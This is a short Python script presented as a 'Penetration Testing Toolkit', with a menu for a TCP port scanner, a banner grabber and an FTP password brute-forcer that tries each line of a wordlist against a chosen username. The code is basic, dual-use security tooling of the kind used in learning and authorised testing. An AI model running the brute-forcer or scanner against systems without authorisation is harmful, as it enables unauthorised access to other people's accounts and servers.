import socket
from ftplib import FTP

def port_scan():
    target = input("\nEnter Target IP Address: ")
    ports = input("Enter comma-separated ports (e.g., 21,22,80): ")
    port_list = [int(p.strip()) for p in ports.split(",")]

    print(f"\n[+] Scanning {target}...\n")
    for port in port_list:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((target, port))
            print(f"[+] Port {port} is OPEN")
            s.close()
        except:
            print(f"[-] Port {port} is CLOSED")

def ftp_brute_force():
    target = input("\nEnter FTP Server IP: ")
    username = input("Enter Username: ")
    wordlist_path = input("Enter path to password list (e.g., passwords.txt): ")

    try:
        with open(wordlist_path, 'r') as file:
            for password in file:
                password = password.strip()
                try:
                    ftp = FTP(target)
                    ftp.login(user=username, passwd=password)
                    print(f"[+] Login Successful → {username}:{password}")
                    ftp.quit()
                    return
                except:
                    print(f"[-] Failed Login → {username}:{password}")
    except FileNotFoundError:
        print("[-] Wordlist file not found.")

def banner_grab():
    ip = input("\nEnter Target IP: ")
    port = int(input("Enter Port: "))

    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        banner = s.recv(1024).decode().strip()
        print(f"[+] Banner: {banner}")
        s.close()
    except Exception as e:
        print(f"[-] Error grabbing banner: {e}")

def main():
    while True:
        print("\n=== Penetration Testing Toolkit ===")
        print("1. Port Scanner")
        print("2. FTP Brute Force")
        print("3. Banner Grabber")
        print("4. Exit")

        choice = input("Choose an option: ")

        if choice == '1':
            port_scan()
        elif choice == '2':
            ftp_brute_force()
        elif choice == '3':
            banner_grab()
        elif choice == '4':
            print("Exiting... Stay ethical! 👋")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
